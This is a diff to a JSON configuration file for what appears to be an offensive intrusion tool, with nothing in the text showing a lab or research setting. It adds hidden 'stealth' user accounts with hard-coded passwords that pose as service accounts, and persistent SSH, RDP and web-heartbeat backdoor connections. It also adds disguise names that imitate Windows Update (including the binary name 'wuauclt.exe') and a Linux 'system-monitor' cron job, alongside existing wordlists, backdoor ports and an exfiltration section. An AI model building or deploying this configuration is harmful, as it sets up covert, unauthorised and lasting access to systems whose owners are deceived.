@@ -14,7 +14,15 @@
     "password_lists": [
       "/usr/share/wordlists/rockyou.txt",
       "/usr/share/wordlists/metasploit/unix_passwords.txt"
-    ]
+    ],
+    "stealth_users": {
+      "windows": ["svc_windowsupdate", "svc_systemmaintenance", "svc_networkmonitor"],
+      "linux": ["svc_loganalyzer", "svc_systemmonitor", "svc_networkcheck"]
+    },
+    "stealth_passwords": {
+      "windows": ["W1nd0ws_Upd@te_2024!", "Syst3m_M@int3n@nce_2024!", "N3tw0rk_M0n1t0r_2024!"],
+      "linux": ["L0g_@n@lyz3r_2024!", "Syst3m_M0n1t0r_2024!", "N3tw0rk_Ch3ck_2024!"]
+    }
   },
   "targets": {
     "common_ports": [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 993, 995, 1433, 3389, 5432, 5900, 8080],
@@ -45,7 +53,39 @@
   "persistence": {
     "backdoor_ports": [4444, 5555, 6666],
     "scheduled_tasks": true,
-    "registry_modifications": true
+    "registry_modifications": true,
+    "stealth_mode": true,
+    "persistent_connections": {
+      "ssh": {
+        "enabled": true,
+        "port": 2222,
+        "retry_interval": 60
+      },
+      "rdp": {
+        "enabled": true,
+        "port": 3389,
+        "retry_interval": 300
+      },
+      "web": {
+        "enabled": true,
+        "port": 8080,
+        "endpoint": "/heartbeat",
+        "retry_interval": 300
+      }
+    },
+    "stealth_names": {
+      "windows": {
+        "service": "WindowsUpdateService",
+        "task": "WindowsUpdateService",
+        "registry": "WindowsUpdate",
+        "binary": "wuauclt.exe"
+      },
+      "linux": {
+        "service": "system-monitor",
+        "cron": "system-monitor",
+        "script": "system-monitor.sh"
+      }
+    }
   },
   "exfiltration": {
     "remote_server": "",
